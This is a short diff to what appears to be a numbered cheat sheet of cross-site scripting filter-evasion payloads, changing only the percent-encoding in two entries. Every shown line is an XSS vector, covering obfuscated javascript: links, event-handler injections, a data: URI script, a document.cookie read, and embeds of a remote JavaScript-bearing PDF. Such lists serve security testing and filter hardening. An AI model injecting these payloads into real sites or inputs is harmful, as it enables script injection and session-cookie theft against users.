@@ -54,14 +54,14 @@
 50) </svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera}
 51) <a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
 52) <div onmouseover='alert&lpar;1&rpar;'>DIV</div>
-53) <iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
+53) <iframe style="position:absolute;top:0;left:0;width:100%25;height:100%25" onmouseover="prompt(1)">
 54) <a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
 55) <embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
 56) <object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
 57) <var onmouseover="prompt(1)">On Mouse Over</var>
 58) <a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
 59) <img src="/" =_=" title="onerror='prompt(1)'">
-60) <%<!--'%><script>alert(1);</script -->
+60) <%25<!--'%25><script>alert(1);</script -->
 61) <script src="data:text/javascript,alert(1)"></script>
 62) <iframe/src \/\/onload = prompt(1)
 63) <iframe/onreadystatechange=alert(1)
